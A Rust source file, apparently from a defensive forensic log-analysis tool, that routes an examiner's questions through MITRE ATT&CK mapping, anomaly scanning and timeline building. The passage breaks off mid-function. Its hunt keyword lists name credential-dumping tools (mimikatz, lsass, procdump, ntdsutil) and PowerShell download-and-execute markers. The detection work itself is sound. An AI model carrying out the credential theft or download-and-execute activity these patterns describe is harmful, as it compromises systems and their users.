use crate::commands::FileTarget;
use crate::db::{self, ColumnMeta};
use crate::intel::activity::{self, ActivityScanSummary};
use crate::intel::anomaly::{self, AnomalyScanSummary};
use crate::intel::matcher::{self, IntelScanSummary};
use crate::intel::query as guided_query;
use crate::intel::roles;
use crate::intel::time;
use anyhow::Result;
use rusqlite::Connection;
use serde::Serialize;
use std::collections::{HashMap, HashSet};

const MAX_TOP_VALUES: usize = 3;
const MAX_NARRATED_CHAINS: usize = 3;
const MAX_NARRATED_TECHNIQUES: usize = 5;
const MAX_NARRATED_ANOMALIES: usize = 5;
const MAX_CITED_ROWS: usize = 10;
const MAX_NARRATED_TIMELINE_EVENTS: usize = 40;

#[derive(Debug, Clone, Copy, Eq, PartialEq)]
pub enum AnalystIntent {
    Profile,
    Map,
    Chains,
    Report,
    Search,
    Timeline,
    Hunt,
}

impl AnalystIntent {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Profile => "profile",
            Self::Map => "map",
            Self::Chains => "chains",
            Self::Report => "report",
            Self::Search => "search",
            Self::Timeline => "timeline",
            Self::Hunt => "hunt",
        }
    }
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AnalystStep {
    pub step: String,
    pub status: String,
    pub detail: String,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AnalystLine {
    pub text: String,
    pub rows: Vec<i64>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AnalystSection {
    pub heading: String,
    pub lines: Vec<AnalystLine>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AnalystAnswer {
    pub intent: String,
    pub headline: String,
    pub sections: Vec<AnalystSection>,
    pub steps: Vec<AnalystStep>,
    pub report_requested: bool,
    pub use_guided_search: bool,
    pub scan: Option<IntelScanSummary>,
    pub anomalies: Option<AnomalyScanSummary>,
    pub activity: Option<ActivityScanSummary>,
}

/// Classifies a free-text ask. Everything the analyst can answer itself runs the pipeline;
/// filter-shaped requests fall back to the existing guided search so the examiner keeps the
/// preview/accept audit flow they already know.
pub fn classify_ask(text: &str) -> AnalystIntent {
    let lower = text.to_lowercase();
    let words: Vec<&str> = lower
        .split(|c: char| !(c.is_alphanumeric() || c == '&' || c == '\''))
        .filter(|word| !word.is_empty())
        .collect();
    let has_word = |wanted: &[&str]| words.iter().any(|word| wanted.contains(word));
    let has_phrase = |wanted: &[&str]| wanted.iter().any(|phrase| lower.contains(phrase));

    // Explicit filter verbs stay with the guided search even when other keywords appear:
    // "filter this by the attacks of alice" is a query, not an analysis request.
    if has_word(&["filter", "filters"]) || has_phrase(&["search for", "show me rows", "rows where", "where "])
    {
        return AnalystIntent::Search;
    }
    if has_word(&["report", "reports", "export", "workbook", "xlsx", "writeup"])
        || has_phrase(&["write up", "write a summary document"])
    {
        return AnalystIntent::Report;
    }
    if has_word(&["timeline", "chronology"])
        || has_phrase(&["sequence of events", "timeline for", "timeline of"])
    {
        return AnalystIntent::Timeline;
    }
    if has_word(&[
        "chain",
        "chains",
        "chained",
        "story",
        "sequence",
        "correlate",
        "correlated",
        "progression",
        "trace",
    ]) {
        return AnalystIntent::Chains;
    }
    if has_phrase(&[
        "what is in",
        "what's in",
        "whats in",
        "tell me about",
        "what happened",
        "what do we have",
        "row by row",
        "line by line",
        "every row",
        "each row",
        "what activity",
        "which activity",
        "activity is there",
        "all activity",
        "all the activity",
    ]) || has_word(&[
        "parse",
        "parsed",
        "parsing",
        "overview",
        "summary",
        "summarize",
        "summarise",
        "profile",
        "describe",
        "analyze",
        "analyse",
        "triage",
    ]) {
        return AnalystIntent::Profile;
    }
    if has_word(&[
        "mitre",
        "att&ck",
        "attack",
        "attacks",
        "technique",
        "techniques",
        "tactic",
        "tactics",
        "dfir",
        "map",
        "mapped",
        "mapping",
        "suspicious",
        "anomalies",
        "anomalous",
        "anomaly",
        "unusual",
        "malicious",
        "ioc",
        "iocs",
        "indicator",
        "indicators",
    ]) {
        return AnalystIntent::Map;
    }
    AnalystIntent::Hunt
}

/// The analyst front door: takes a free-text ask, auto-runs whatever pipeline steps the
/// answer needs (data mapping, timestamp normalization when unambiguous, MITRE scan, chain
/// detection, wide-net anomaly scan), and composes a narrative built only from the computed
/// tables — every claim carries the source row numbers, nothing is invented.
pub fn ask(
    conn: &mut Connection,
    columns: &[ColumnMeta],
    ask_text: &str,
    mut on_progress: impl FnMut(&str),
) -> Result<AnalystAnswer> {
    let intent = classify_ask(ask_text);
    if intent == AnalystIntent::Search {
        return Ok(AnalystAnswer {
            intent: intent.as_str().to_string(),
            headline: "This reads like a filter/search request — use the guided search flow."
                .to_string(),
            sections: Vec::new(),
            steps: Vec::new(),
            report_requested: false,
            use_guided_search: true,
            scan: None,
            anomalies: None,
            activity: None,
        });
    }

    let mut steps = Vec::new();

    // Step 1: data mapping. Existing decisions (including rejections) are respected; the
    // detector only fills in what the examiner has not decided yet.
    on_progress("mapping");
    let had_roles = !load_active_roles(conn)?.is_empty();
    match roles::detect_column_roles(conn, columns) {
        Ok(suggestions) => {
            let described: Vec<String> = suggestions
                .iter()
                .filter(|suggestion| suggestion.status != "rejected")
                .map(|suggestion| format!("{}→{}", suggestion.role, suggestion.original_name))
                .collect();
            steps.push(AnalystStep {
                step: "data_mapping".to_string(),
                status: if had_roles { "reused" } else { "ran" }.to_string(),
                detail: if described.is_empty() {
                    "no column roles could be suggested".to_string()
                } else {
                    described.join(", ")
                },
            });
        }
        Err(error) => steps.push(AnalystStep {
            step: "data_mapping".to_string(),
            status: "failed".to_string(),
            detail: error.to_string(),
        }),
    }

    // Step 2: timestamp normalization — only when it needs no examiner judgment. Ambiguous
    // timezones/date conventions stay a human decision; the analyst says so instead of
    // guessing (same stance as the timeline feature itself).
    on_progress("timeline");
    match time::analyze_confirmed_timestamp_column(conn, columns) {
        Err(error) => steps.push(AnalystStep {
            step: "timeline".to_string(),
            status: "skipped".to_string(),
            detail: format!("no usable timestamp mapping: {error}"),
        }),
        Ok(analysis) => {
            if analysis.needs_timezone || analysis.needs_date_convention {
                let status = if row_time_available(conn)? {
                    "reused"
                } else {
                    "skipped"
                };
                steps.push(AnalystStep {
                    step: "timeline".to_string(),
                    status: status.to_string(),
                    detail: if status == "reused" {
                        "kept the previously normalized timeline; new normalization needs a timezone/date answer".to_string()
                    } else {
                        "timestamps need an examiner answer (timezone or date convention) before a timeline can be built".to_string()
                    },
                });
            } else if time::row_time_is_bound_to(conn, columns, &analysis.timestamp_column)
                .unwrap_or(false)
            {
                steps.push(AnalystStep {
                    step: "timeline".to_string(),
                    status: "reused".to_string(),
                    detail: format!(
                        "timeline already normalized from '{}'",
                        analysis.original_name
                    ),
                });
            } else {
                match time::normalize_timestamp_column_with_options(conn, columns, None, None) {
                    Ok(summary) => steps.push(AnalystStep {
                        step: "timeline".to_string(),
                        status: "ran".to_string(),
                        detail: format!(
                            "normalized {} rows to UTC from '{}'",
                            summary.rows_written, summary.original_name
                        ),
                    }),
                    Err(error) => steps.push(AnalystStep {
                        step: "timeline".to_string(),
                        status: "failed".to_string(),
                        detail: error.to_string(),
                    }),
                }
            }
        }
    }

    // Step 3: MITRE scan + chain detection over the active evidence mappings.
    on_progress("mitre-scan");
    let mut scan_summary = None;
    let evidence_columns = guided_query::active_evidence_columns(conn)?;
    if evidence_columns.is_empty() {
        steps.push(AnalystStep {
            step: "mitre_scan".to_string(),
            status: "skipped".to_string(),
            detail: "no evidence columns are mapped (command line/process/file/host/text)"
                .to_string(),
        });
    } else {
        match matcher::scan_connection(conn, &evidence_columns, |_, _, _| {}) {
            Ok(summary) => {
                steps.push(AnalystStep {
                    step: "mitre_scan".to_string(),
                    status: "ran".to_string(),
                    detail: format!(
                        "{} matches on {} rows, {} chains",
                        summary.match_count,
                        summary.matched_rows,
                        summary.chains.len()
                    ),
                });
                scan_summary = Some(summary);
            }
            Err(error) => steps.push(AnalystStep {
                step: "mitre_scan".to_string(),
                status: "failed".to_string(),
                detail: error.to_string(),
            }),
        }
    }

    // Step 4: wide-net anomaly scan — independent of the curated library, tolerant of
    // false positives by design.
    on_progress("anomaly-scan");
    let mut anomaly_summary = None;
    match anomaly::scan_anomalies(conn, columns, |_, _, _| {}) {
        Ok(summary) => {
            steps.push(AnalystStep {
                step: "anomaly_scan".to_string(),
                status: "ran".to_string(),
                detail: format!(
                    "{} heuristic findings on {} rows",
                    summary.finding_count, summary.flagged_rows
                ),
            });
            anomaly_summary = Some(summary);
        }
        Err(error) => steps.push(AnalystStep {
            step: "anomaly_scan".to_string(),
            status: "failed".to_string(),
            detail: error.to_string(),
        }),
    }

    // Step 5: per-row activity classification — every row gets a label, so "what activity is
    // there row by row" can be answered about the whole file, not just the suspicious slice.
    on_progress("activity");
    let mut activity_summary = None;
    match activity::classify_rows(conn, columns, |_, _, _| {}) {
        Ok(summary) => {
            steps.push(AnalystStep {
                step: "activity".to_string(),
                status: "ran".to_string(),
                detail: format!(
                    "classified all {} rows into {} activity types",
                    summary.rows_classified,
                    summary.categories.len()
                ),
            });
            activity_summary = Some(summary);
        }
        Err(error) => steps.push(AnalystStep {
            step: "activity".to_string(),
            status: "failed".to_string(),
            detail: error.to_string(),
        }),
    }

    // Step 6: how many rows active ignore rules excluded from steps 3-5 above. Dataset-wide,
    // not specific to any one stage, so it's stated once here rather than repeated in each of
    // their details — by this point every stage above has run, so `_ignored_rows` is populated.
    on_progress("ignore-rules");
    match crate::intel::ignore_rules::ignored_rows_summary(conn) {
        Ok((rows_ignored, by_rule)) if rows_ignored > 0 => {
            let breakdown = by_rule
                .iter()
                .map(|rule| format!("{} ({})", rule.rule_name, rule.row_count))
                .collect::<Vec<_>>()
                .join(", ");
            steps.push(AnalystStep {
                step: "ignore_rules".to_string(),
                status: "ran".to_string(),
                detail: format!(
                    "{rows_ignored} row(s) excluded from analysis by active ignore rules: {breakdown}"
                ),
            });
        }
        Ok(_) => steps.push(AnalystStep {
            step: "ignore_rules".to_string(),
            status: "ran".to_string(),
            detail: "no rows excluded by ignore rules".to_string(),
        }),
        Err(error) => steps.push(AnalystStep {
            step: "ignore_rules".to_string(),
            status: "failed".to_string(),
            detail: error.to_string(),
        }),
    }

    on_progress("compose");
    let (hunt_sec, timeline_sec, hunt_summary, timeline_summary) = match intent {
        AnalystIntent::Timeline => {
            let keywords = extract_timeline_keywords(ask_text);
            let row_ids = find_matching_timeline_rows(conn, &keywords, columns)?;
            let (section, summary) = timeline_section(conn, columns, &keywords, &row_ids)?;
            (None, Some(section), None, summary)
        }
        AnalystIntent::Hunt => {
            let (topic_name, patterns) = resolve_hunt_patterns(ask_text);
            let row_ids = find_hunt_rows(conn, &patterns, columns)?;
            let hunt_sec = build_hunt_section(conn, columns, &topic_name, &patterns, &row_ids)?;
            let (tl_sec, tl_sum) = timeline_section(conn, columns, &patterns, &row_ids)?;
            (Some(hunt_sec), Some(tl_sec), Some((row_ids.len(), topic_name)), tl_sum)
        }
        _ => (None, None, None, None),
    };

    let sections = compose_sections(
        conn,
        columns,
        intent,
        hunt_sec,
        timeline_sec,
        scan_summary.as_ref(),
        anomaly_summary.as_ref(),
        activity_summary.as_ref(),
    )?;
    let headline = compose_headline(
        intent,
        scan_summary.as_ref(),
        anomaly_summary.as_ref(),
        timeline_summary.as_ref(),
        hunt_summary.as_ref(),
        activity_summary.as_ref(),
    );

    Ok(AnalystAnswer {
        intent: intent.as_str().to_string(),
        headline,
        sections,
        steps,
        report_requested: intent == AnalystIntent::Report,
        use_guided_search: false,
        scan: scan_summary,
        anomalies: anomaly_summary,
        activity: activity_summary,
    })
}

fn compose_headline(
    intent: AnalystIntent,
    scan: Option<&IntelScanSummary>,
    anomalies: Option<&AnomalyScanSummary>,
    timeline_summary: Option<&(usize, String, String)>,
    hunt_summary: Option<&(usize, String)>,
    activity: Option<&ActivityScanSummary>,
) -> String {
    if intent == AnalystIntent::Hunt {
        if let Some((count, topic)) = hunt_summary {
            if *count > 0 {
                return format!("Investigative Hunt: {count} event(s) identified for '{topic}'.");
            } else {
                return format!("Investigative Hunt: No events matching '{topic}' were found in this dataset.");
            }
        }
    }

    if intent == AnalystIntent::Timeline {
        if let Some((count, kw_desc, duration)) = timeline_summary {
            if *count > 0 {
                let dur = if duration.is_empty() {
                    String::new()
                } else {
                    format!(" spanning {duration}")
                };
                return format!(
                    "Chronological timeline: {count} events identified for {kw_desc}{dur}."
                );
            } else {
                return format!(
                    "No events found matching {kw_desc}. Broaden the keywords or verify data mapping."
                );
            }
        }
    }

    if let Some(scan) = scan {
        if let Some(chain) = scan.chains.first() {
            let host = chain
                .host
                .as_deref()
                .map(|host| format!(" on host {host}"))
                .unwrap_or_default();
            return format!(
                "Chained attack activity{host}: {} tactics ({}) across {} rows.",
                chain.tactic_count,
                chain.tactic_names.join(" → "),
                chain.row_count
            );
        }
    }

    if intent == AnalystIntent::Profile {
        if let Some(act) = activity {
            return format!(
                "Dataset overview: {} rows analyzed and classified into {} activity types.",
                act.rows_classified,
                act.categories.len()
            );
        }
    }

    if intent == AnalystIntent::Chains {
        return "No multi-tactic attack chain identified across the dataset within any one-hour time window.".to_string();
    }

    if intent == AnalystIntent::Map {
        if let Some(scan) = scan {
            if scan.match_count > 0 {
                let top_tactic = scan
                    .tactics
                    .first()
                    .map(|tactic| format!(" — most active tactic: {}", tactic.name))
                    .unwrap_or_default();
                return format!(
                    "{} MITRE-mapped findings on {} rows across {} tactics{top_tactic}.",
                    scan.match_count, scan.matched_rows, scan.tactics.len()
                );
            } else {
                return "No curated MITRE ATT&CK matches found in active evidence columns.".to_string();
            }
        }
    }

    if let Some(scan) = scan {
        if scan.match_count > 0 {
            let top_tactic = scan
                .tactics
                .first()
                .map(|tactic| format!(" — most active tactic: {}", tactic.name))
                .unwrap_or_default();
            return format!(
                "{} MITRE-mapped findings on {} rows, no multi-tactic chain within one time window{top_tactic}.",
                scan.match_count, scan.matched_rows
            );
        }
    }
    if let Some(anomalies) = anomalies {
        if anomalies.flagged_rows > 0 {
            return format!(
                "No curated MITRE matches; the wide-net heuristic layer flagged {} rows worth reviewing.",
                anomalies.flagged_rows
            );
        }
    }
    "Nothing notable found: no MITRE-mapped matches, no attack chains, and no heuristic anomalies."
        .to_string()
}

fn build_activity_section(activity: &ActivityScanSummary) -> AnalystSection {
    let mut lines = Vec::new();
    lines.push(AnalystLine {
        text: format!(
            "All {} rows classified into {} activity types.",
            activity.rows_classified,
            activity.categories.len()
        ),
        rows: Vec::new(),
    });
    for category in &activity.categories {
        let share = if activity.rows_classified > 0 {
            (category.row_count as f64 / activity.rows_classified as f64) * 100.0
        } else {
            0.0
        };
        let top = if category.top_details.is_empty() {
            String::new()
        } else {
            let described: Vec<String> = category
                .top_details
                .iter()
                .map(|detail| format!("'{}' ({} rows)", detail.detail, detail.row_count))
                .collect();
            format!(" Most common: {}.", described.join(", "))
        };
        lines.push(AnalystLine {
            text: format!(
                "{}: {} rows ({share:.1}%).{top}",
                category.label, category.row_count
            ),
            rows: Vec::new(),
        });
    }
    AnalystSection {
        heading: "Activity, row by row".to_string(),
        lines,
    }
}

fn build_mitre_section(conn: &Connection, scan: &IntelScanSummary) -> Result<AnalystSection> {
    let mut lines = Vec::new();
    if scan.match_count == 0 {
        lines.push(AnalystLine {
            text: "No curated-library matches. The library is curated rather than exhaustive — check the anomaly section for wide-net signals.".to_string(),
            rows: Vec::new(),
        });
    } else {
        lines.push(AnalystLine {
            text: format!(
                "{} matches on {} rows across {} tactics.",
                scan.match_count,
                scan.matched_rows,
                scan.tactics.len()
            ),
            rows: Vec::new(),
        });
        for technique in scan.techniques.iter().take(MAX_NARRATED_TECHNIQUES) {
            let rows = technique_sample_rows(conn, &technique.id)?;
            lines.push(AnalystLine {
                text: format!(
                    "{} ({}): {} rows.",
                    technique.name, technique.id, technique.row_count
                ),
                rows,
            });
        }
    }
    Ok(AnalystSection {
        heading: "MITRE ATT&CK mapping".to_string(),
        lines,
    })
}

fn build_chains_section(scan: &IntelScanSummary) -> AnalystSection {
    let mut chain_lines = Vec::new();
    for chain in scan.chains.iter().take(MAX_NARRATED_CHAINS) {
        let host = chain
            .host
            .as_deref()
            .map(|host| format!("on host {host}"))
            .unwrap_or_else(|| "with no host mapping".to_string());
        let window = match (chain.start_epoch_ms, chain.end_epoch_ms) {
            (Some(start), Some(end)) => {
                format!(" between {} and {}", format_utc(start), format_utc(end))
            }
            _ => String::new(),
        };
        chain_lines.push(AnalystLine {
            text: format!(
                "Chain {} {host}{window}: {} → progression over {} rows (score {}). Techniques: {}.",
                chain.chain_id,
                chain.tactic_names.join(" → "),
                chain.row_count,
                chain.score,
                chain.technique_names.join(", ")
            ),
            rows: chain.sample_rows.iter().copied().take(MAX_CITED_ROWS).collect(),
        });
    }
    if chain_lines.is_empty() {
        chain_lines.push(AnalystLine {
            text: "No multi-tactic chain: matched activity does not progress across ≥3 tactics on one host within an hour.".to_string(),
            rows: Vec::new(),
        });
    }
    AnalystSection {
        heading: "Attack chains".to_string(),
        lines: chain_lines,
    }
}

fn build_anomalies_section(anomalies: &AnomalyScanSummary) -> AnalystSection {
    let mut lines = Vec::new();
    if anomalies.flagged_rows == 0 {
        lines.push(AnalystLine {
            text: "The wide-net heuristic layer found nothing beyond the curated library.".to_string(),
            rows: Vec::new(),
        });
    } else {
        lines.push(AnalystLine {
            text: format!(
                "Wide-net heuristics (false positives expected by design) flagged {} findings on {} rows.",
                anomalies.finding_count, anomalies.flagged_rows
            ),
            rows: Vec::new(),
        });
        let categories: Vec<String> = anomalies
            .categories
            .iter()
            .map(|category| format!("{} ({} rows)", category.label, category.row_count))
            .collect();
        if !categories.is_empty() {
            lines.push(AnalystLine {
                text: format!("Categories: {}.", categories.join(", ")),
                rows: Vec::new(),
            });
        }
        for row in anomalies.top_rows.iter().take(MAX_NARRATED_ANOMALIES) {
            lines.push(AnalystLine {
                text: format!("Row {}: {}.", row.row_num, row.top_reason),
                rows: vec![row.row_num],
            });
        }
    }
    AnalystSection {
        heading: "Anomalies (heuristic)".to_string(),
        lines,
    }
}

fn compose_sections(
    conn: &Connection,
    columns: &[ColumnMeta],
    intent: AnalystIntent,
    hunt_section: Option<AnalystSection>,
    timeline_section: Option<AnalystSection>,
    scan: Option<&IntelScanSummary>,
    anomalies: Option<&AnomalyScanSummary>,
    activity: Option<&ActivityScanSummary>,
) -> Result<Vec<AnalystSection>> {
    if intent == AnalystIntent::Timeline {
        if let Some(tl) = timeline_section {
            return Ok(vec![tl]);
        }
    }

    if intent == AnalystIntent::Hunt {
        let mut secs = Vec::new();
        if let Some(hs) = hunt_section {
            secs.push(hs);
        }
        if let Some(tl) = timeline_section {
            secs.push(tl);
        }
        return Ok(secs);
    }

    let mut sections = Vec::new();

    match intent {
        AnalystIntent::Timeline | AnalystIntent::Hunt => {
            // Handled above
        }
        AnalystIntent::Profile => {
            sections.push(dataset_section(conn, columns)?);
            if let Some(activity) = activity {
                sections.push(build_activity_section(activity));
            }
        }
        AnalystIntent::Map => {
            if let Some(scan) = scan {
                sections.push(build_mitre_section(conn, scan)?);
                sections.push(build_chains_section(scan));
            }
            if let Some(anomalies) = anomalies {
                if anomalies.flagged_rows > 0 {
                    sections.push(build_anomalies_section(anomalies));
                }
            }
        }
        AnalystIntent::Chains => {
            if let Some(scan) = scan {
                sections.push(build_chains_section(scan));
                sections.push(build_mitre_section(conn, scan)?);
            }
            if let Some(anomalies) = anomalies {
                sections.push(build_anomalies_section(anomalies));
            }
        }
        AnalystIntent::Report | AnalystIntent::Search => {
            sections.push(dataset_section(conn, columns)?);
            if let Some(activity) = activity {
                sections.push(build_activity_section(activity));
            }
            if let Some(scan) = scan {
                sections.push(build_mitre_section(conn, scan)?);
                sections.push(build_chains_section(scan));
            }
            if let Some(anomalies) = anomalies {
                sections.push(build_anomalies_section(anomalies));
            }
        }
    }

    Ok(sections)
}

fn dataset_section(conn: &Connection, columns: &[ColumnMeta]) -> Result<AnalystSection> {
    let mut lines = Vec::new();
    if let Ok(info) = db::load_import_info(conn) {
        let file_name = std::path::Path::new(&info.source_path)
            .file_name()
            .map(|name| name.to_string_lossy().to_string())
            .unwrap_or_else(|| info.source_path.clone());
        lines.push(AnalystLine {
            text: format!(
                "{} rows, {} columns from '{}' (sheet '{}').",
                info.row_count,
                columns.len(),
                file_name,
                info.sheet_name
            ),
            rows: Vec::new(),
        });
    }

    let roles = load_active_roles(conn)?;
    if !roles.is_empty() {
        let described: Vec<String> = roles
            .iter()
            .map(|(role, sql_name)| {
                let original = columns
                    .iter()
                    .find(|column| &column.sql_name == sql_name)
                    .map(|column| column.original_name.as_str())
                    .unwrap_or(sql_name.as_str());
                format!("{role}: {original}")
            })
            .collect();
        lines.push(AnalystLine {
            text: format!("Column mapping — {}.", described.join(", ")),
            rows: Vec::new(),
        });
    }

    if let Some((start, end)) = time_range(conn)? {
        lines.push(AnalystLine {
            text: format!(
                "Events span {} to {} (UTC).",
                format_utc(start),
                format_utc(end)
            ),
            rows: Vec::new(),
        });
    }

    let role_map: HashMap<String, String> = roles.into_iter().collect();
    for (role, label) in [("user", "Users"), ("host", "Hosts")] {
        if let Some(sql_name) = role_map.get(role) {
            let top = top_values(conn, sql_name)?;
            if !top.is_empty() {
                let described: Vec<String> = top
                    .iter()
                    .map(|(value, count)| format!("{value} ({count} rows)"))
                    .collect();
                lines.push(AnalystLine {
                    text: format!("{label}: {}.", described.join(", ")),
                    rows: Vec::new(),
                });
            }
        }
    }

    Ok(AnalystSection {
        heading: "Dataset".to_string(),
        lines,
    })
}

fn load_active_roles(conn: &Connection) -> Result<Vec<(String, String)>> {
    if !table_exists(conn, "_column_roles")? {
        return Ok(Vec::new());
    }
    let mut stmt = conn.prepare(
        "SELECT role, sql_name FROM _column_roles
         WHERE status IN ('suggested', 'confirmed')
         ORDER BY role",
    )?;
    let rows = stmt
        .query_map([], |row| Ok((row.get(0)?, row.get(1)?)))?
        .collect::<rusqlite::Result<Vec<_>>>()?;
    Ok(rows)
}

fn row_time_available(conn: &Connection) -> Result<bool> {
    if !table_exists(conn, "_row_time")? {
        return Ok(false);
    }
    let count: i64 = conn.query_row("SELECT COUNT(*) FROM _row_time", [], |row| row.get(0))?;
    Ok(count > 0)
}

fn time_range(conn: &Connection) -> Result<Option<(i64, i64)>> {
    if !row_time_available(conn)? {
        return Ok(None);
    }
    let range: (Option<i64>, Option<i64>) = conn.query_row(
        "SELECT MIN(epoch_ms), MAX(epoch_ms) FROM _row_time",
        [],
        |row| Ok((row.get(0)?, row.get(1)?)),
    )?;
    Ok(match range {
        (Some(start), Some(end)) => Some((start, end)),
        _ => None,
    })
}

fn top_values(conn: &Connection, sql_name: &str) -> Result<Vec<(String, i64)>> {
    let ident = db::quote_ident(sql_name);
    let mut stmt = conn.prepare(&format!(
        "SELECT {ident}, COUNT(*) FROM rows
         WHERE {ident} IS NOT NULL AND TRIM({ident}) != ''
         GROUP BY {ident}
         ORDER BY COUNT(*) DESC
         LIMIT {MAX_TOP_VALUES}"
    ))?;
    let rows = stmt
        .query_map([], |row| Ok((row.get::<_, String>(0)?, row.get(1)?)))?
        .collect::<rusqlite::Result<Vec<_>>>()?;
    Ok(rows)
}

fn technique_sample_rows(conn: &Connection, technique_id: &str) -> Result<Vec<i64>> {
    let mut stmt = conn.prepare(
        "SELECT DISTINCT row_num FROM _intel_match
         WHERE technique_id = ?1
         ORDER BY score DESC, row_num ASC
         LIMIT 3",
    )?;
    let rows = stmt
        .query_map([technique_id], |row| row.get(0))?
        .collect::<rusqlite::Result<Vec<_>>>()?;
    Ok(rows)
}

fn format_utc(epoch_ms: i64) -> String {
    chrono::DateTime::from_timestamp_millis(epoch_ms)
        .map(|dt| dt.format("%Y-%m-%d %H:%M:%S UTC").to_string())
        .unwrap_or_else(|| format!("epoch {epoch_ms}ms"))
}

fn table_exists(conn: &Connection, name: &str) -> Result<bool> {
    let exists: i64 = conn.query_row(
        "SELECT EXISTS(SELECT 1 FROM sqlite_master WHERE type = 'table' AND name = ?1)",
        [name],
        |row| row.get(0),
    )?;
    Ok(exists != 0)
}

pub fn extract_timeline_keywords(ask_text: &str) -> Vec<String> {
    let lower = ask_text.to_lowercase();
    let cleaned = lower
        .replace("timeline for", " ")
        .replace("timeline of", " ")
        .replace("sequence of events for", " ")
        .replace("sequence of events", " ")
        .replace("chronology for", " ")
        .replace("chronology of", " ")
        .replace("timeline", " ")
        .replace("chronology", " ")
        .replace("generate", " ")
        .replace("create", " ")
        .replace("build", " ")
        .replace("show me", " ")
        .replace("events for", " ");

    let stop_words = [
        "for", "of", "the", "in", "and", "or", "with", "events", "event",
        "to", "a", "an", "show", "me", "by", "on", "from", "at", "all", "row", "rows",
    ];

    let mut keywords = Vec::new();
    for part in cleaned.split([',', ';', '\n', '\r']) {
        let tokens: Vec<&str> = part
            .split_whitespace()
            .filter(|t| !stop_words.contains(t) && t.len() > 1)
            .collect();
        for token in tokens {
            if !keywords.iter().any(|k: &String| k.eq_ignore_ascii_case(token)) {
                keywords.push(token.to_string());
            }
        }
    }
    keywords
}

fn format_duration_ms(duration_ms: i64) -> String {
    let secs = (duration_ms / 1000).max(0);
    if secs < 60 {
        format!("{secs}s")
    } else if secs < 3600 {
        let mins = secs / 60;
        let rem_secs = secs % 60;
        if rem_secs == 0 {
            format!("{mins}m")
        } else {
            format!("{mins}m {rem_secs}s")
        }
    } else if secs < 86400 {
        let hours = secs / 3600;
        let rem_mins = (secs % 3600) / 60;
        if rem_mins == 0 {
            format!("{hours}h")
        } else {
            format!("{hours}h {rem_mins}m")
        }
    } else {
        let days = secs / 86400;
        let rem_hours = (secs % 86400) / 3600;
        format!("{days}d {rem_hours}h")
    }
}

pub fn resolve_hunt_patterns(ask_text: &str) -> (String, Vec<String>) {
    let lower = ask_text.to_lowercase();
    let mut topics = Vec::new();
    let mut patterns = Vec::new();

    let has_inbox = lower.contains("inbox")
        || lower.contains("forward")
        || lower.contains("mail rule")
        || lower.contains("transport rule")
        || lower.contains("inboxrule")
        || lower.contains("mailbox")
        || lower.contains("rule");

    if has_inbox {
        topics.push("Inbox Rules & Mail Forwarding");
        patterns.extend([
            "New-InboxRule".to_string(),
            "Set-InboxRule".to_string(),
            "Update-InboxRule".to_string(),
            "Enable-InboxRule".to_string(),
            "Disable-InboxRule".to_string(),
            "Remove-InboxRule".to_string(),
            "InboxRule".to_string(),
            "ForwardTo".to_string(),
            "RedirectTo".to_string(),
            "ForwardAsAttachmentTo".to_string(),
            "DeliverToMailboxAndForward".to_string(),
            "New-TransportRule".to_string(),
            "Set-TransportRule".to_string(),
            "Set-Mailbox".to_string(),
            "Add-MailboxPermission".to_string(),
            "inboxrule".to_string(),
            "inbox rule".to_string(),
            "forwarding".to_string(),
        ]);
    }

    let has_consent = lower.contains("consent")
        || lower.contains("oauth")
        || lower.contains("grant")
        || lower.contains("service principal")
        || lower.contains("app consent");

    if has_consent {
        topics.push("Consent Grants & OAuth Applications");
        patterns.extend([
            "ConsentToApplication".to_string(),
            "Consent to application".to_string(),
            "Add service principal".to_string(),
            "Add app role assignment".to_string(),
            "OAuth2PermissionGrant".to_string(),
            "Application".to_string(),
            "Grant".to_string(),
            "Consent".to_string(),
        ]);
    }

    let has_auth = lower.contains("logon")
        || lower.contains("login")
        || lower.contains("brute")
        || lower.contains("spray")
        || lower.contains("failed")
        || lower.contains("failure")
        || lower.contains("password");

    if has_auth {
        topics.push("Failed Logons & Brute Force");
        patterns.extend([
            "UserLoginFailed".to_string(),
            "4625".to_string(),
            "failure".to_string(),
            "failed".to_string(),
            "invalid credentials".to_string(),
            "bad password".to_string(),
            "UserLoggedIn".to_string(),
        ]);
    }

    let has_powershell = lower.contains("powershell")
        || lower.contains("pwsh")
        || lower.contains("encoded")
        || lower.contains("script");

    if has_powershell {
        topics.push("PowerShell & Script Execution");
        patterns.extend([
            "powershell".to_string(),
            "pwsh".to_string(),
            "-enc".to_string(),
            "-encodedcommand".to_string(),
            "invoke-expression".to_string(),
            "iex".to_string(),
            "downloadstring".to_string(),
            "bypass".to_string(),
            "cmd.exe".to_string(),
        ]);
    }

    let has_creds = lower.contains("mimikatz")
        || lower.contains("lsass")
        || lower.contains("credential")
        || lower.contains("dump");

    if has_creds {
        topics.push("Credential Access & Dumping");
        patterns.extend([
            "mimikatz".to_string(),
            "lsass".to_string(),
            "sekurlsa".to_string(),
            "logonpasswords".to_string(),
            "procdump".to_string(),
            "comsvcs".to_string(),
            "ntdsutil".to_string(),
        ]);
    }

    let has_admin = lower.contains("admin")
        || lower.contains("role")
        || lower.contains("assignment")
        || lower.contains("privilege")
        || lower.contains("escalat");

    if has_admin && !has_consent {
        topics.push("Admin Operations & Role Assignments");
        patterns.extend([
            "Add-RoleGroupMember".to_string(),
            "Add-MsolRoleMember".to_string(),
            "New-ManagementRoleAssignment".to_string(),
            "Elevated".to_string(),
            "Admin".to_string(),
            "Role".to_string(),
        ]);
    }

    // Add query tokens (cleaned of stop words)
    let raw_tokens = extract_timeline_keywords(ask_text);
    for tok in raw_tokens {
        if !patterns.iter().any(|p| p.eq_ignore_ascii_case(&tok)) {
            patterns.push(tok);
        }
    }

    let topic_name = if topics.is_empty() {
        if patterns.is_empty() {
            "Evidence Hunt".to_string()
        } else {
            format!("'{}'", patterns[..patterns.len().min(3)].join("', '"))
        }
    } else {
        topics.join(" & ")
    };

    (topic_name, patterns)
}

pub fn find_hunt_rows(
    conn: &Connection,
    patterns: &[String],
    columns: &[ColumnMeta],
) -> Result<Vec<i64>> {
    if patterns.is_empty() {
        return Ok(Vec::new());
    }

    let mut row_set = std::collections::BTreeSet::new();

    // 1. Check FTS if available
    if table_exists(conn, "rows_fts")? {
